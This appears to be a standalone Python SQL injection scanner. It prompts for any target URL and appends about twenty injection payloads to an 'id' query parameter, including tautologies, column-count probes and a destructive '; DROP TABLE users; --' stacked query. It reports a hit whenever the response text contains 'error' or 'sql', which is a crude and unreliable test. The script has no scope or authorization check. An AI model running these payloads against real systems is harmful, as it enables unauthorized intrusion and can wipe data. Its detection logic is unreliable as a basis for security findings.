import requests

def check_sql_injection(url):
    # Common SQL injection payloads
    payloads = [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR '1'='1' /*",
        "'; DROP TABLE users; --",
        "'; SELECT * FROM users; --",
        "AND 1",
        "AND 0",
        "AND true",
        "AND false",
        "1-false",
        "1-true",
        "1*56",
        "-2",
        "1' ORDER BY 1--+",
        "1' ORDER BY 2--+",
        "1' ORDER BY 3--+",
        "1' ORDER BY 1,2--+",
        "1' ORDER BY 1,2,3--+",
        "1' GROUP BY 1,2,--+",
        "1' GROUP BY 1,2,3--+"
    ]

    for payload in payloads:
        # Construct the URL with the payload
        test_url = f"{url}?id={payload}"
        print(f"Testing URL: {test_url}")

        try:
            # Send the request
            response = requests.get(test_url)
            # Check for SQL error messages in the response
            if "error" in response.text.lower() or "sql" in response.text.lower():
                print(f"[!] Potential SQL Injection vulnerability detected with payload: {payload}")
            else:
                print("[+] No vulnerability detected with this payload.")
        except requests.exceptions.RequestException as e:
            print(f"Error during request: {e}")

if __name__ == "__main__":
    target_url = input("Enter the target URL (including http/https): ")
    check_sql_injection(target_url)
